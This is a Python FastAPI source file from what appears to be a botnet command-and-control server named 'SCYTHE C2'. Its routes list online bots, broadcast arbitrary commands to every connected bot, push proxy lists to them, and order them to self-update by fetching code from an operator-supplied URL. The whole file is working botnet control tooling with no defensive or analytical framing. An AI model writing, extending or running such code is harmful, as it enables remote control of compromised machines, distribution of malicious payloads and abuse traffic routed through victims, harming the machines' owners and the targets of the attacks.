"""
Botnet management routes for SCYTHE C2.
"""

from fastapi import APIRouter, Request, HTTPException, Response
from fastapi.responses import JSONResponse
from pydantic import BaseModel
from typing import Optional, List, Dict, Any

from app.core.logger import logger, log_bot_event
from app.core.models import BotStats

router = APIRouter(prefix="/api/botnet", tags=["botnet"])


class BroadcastCommand(BaseModel):
    cmd: str
    payload: Optional[Dict[str, Any]] = None


class UpdateSelfRequest(BaseModel):
    url: str


@router.get("/stats", response_model=BotStats)
async def get_botnet_stats(request: Request):
    botnet_manager = request.app.state.botnet_manager
    stats = await botnet_manager.get_bot_stats()
    logger.debug(f"Botnet stats: {stats}")
    return stats


# FIX: Add HEAD /stats for dashboard health check
@router.head("/stats")
async def head_botnet_stats(request: Request):
    try:
        botnet_manager = request.app.state.botnet_manager
        if botnet_manager._running:
            return Response(status_code=200)
        return Response(status_code=503)
    except Exception:
        return Response(status_code=503)


@router.head("/status")
async def botnet_status(request: Request):
    try:
        botnet_manager = request.app.state.botnet_manager
        if botnet_manager._running:
            return Response(status_code=200)
        else:
            return Response(status_code=503, content={"detail": "Botnet service not running"})
    except Exception:
        return Response(status_code=503, content={"detail": "Botnet service unavailable"})


@router.post("/broadcast")
async def broadcast_command(request: Request, cmd_data: BroadcastCommand):
    botnet_manager = request.app.state.botnet_manager
    try:
        command = {"cmd": cmd_data.cmd}
        if cmd_data.payload:
            command.update(cmd_data.payload)

        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning(f"Broadcast command '{cmd_data.cmd}' skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": f"Command '{cmd_data.cmd}' not sent: no bots connected",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Broadcast command '{cmd_data.cmd}' to {len(bot_ids)} bots")
        return JSONResponse(content={
            "success": True,
            "message": f"Command '{cmd_data.cmd}' broadcasted to {len(bot_ids)} bots",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Broadcast failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/update-proxies")
async def update_bot_proxies(request: Request):
    botnet_manager = request.app.state.botnet_manager
    proxy_manager = request.app.state.proxy_manager
    try:
        proxies = await proxy_manager.get_alive_proxies()
        proxy_strings = [str(p) for p in proxies]
        command = {
            "cmd": "proxy_update",
            "proxies": proxy_strings
        }

        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning("Update proxies skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": "No bots connected, proxy update not sent",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Sent proxy update ({len(proxy_strings)} proxies) to {len(bot_ids)} bots")
        return JSONResponse(content={
            "success": True,
            "message": f"Sent {len(proxy_strings)} proxies to {len(bot_ids)} bots",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Failed to update bot proxies: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/update-self")
async def update_bot_self(request: Request, update_req: UpdateSelfRequest):
    botnet_manager = request.app.state.botnet_manager
    try:
        command = {
            "cmd": "update_self",
            "url": update_req.url
        }

        bot_ids = await botnet_manager.get_active_bot_ids()
        if not bot_ids:
            logger.warning("Self-update skipped: no bots connected")
            return JSONResponse(content={
                "success": True,
                "message": "No bots connected, self-update not sent",
                "bots_reached": 0
            })

        await botnet_manager.broadcast_command(command)
        logger.info(f"Sent self-update command to {len(bot_ids)} bots: {update_req.url}")
        return JSONResponse(content={
            "success": True,
            "message": f"Self-update command sent to {len(bot_ids)} bots. URL: {update_req.url}",
            "bots_reached": len(bot_ids)
        })
    except Exception as e:
        logger.error(f"Self-update failed: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/online")
async def get_online_bots(request: Request):
    botnet_manager = request.app.state.botnet_manager
    bot_ids = await botnet_manager.get_active_bot_ids()
    return {
        "count": len(bot_ids),
        "bots": bot_ids
    }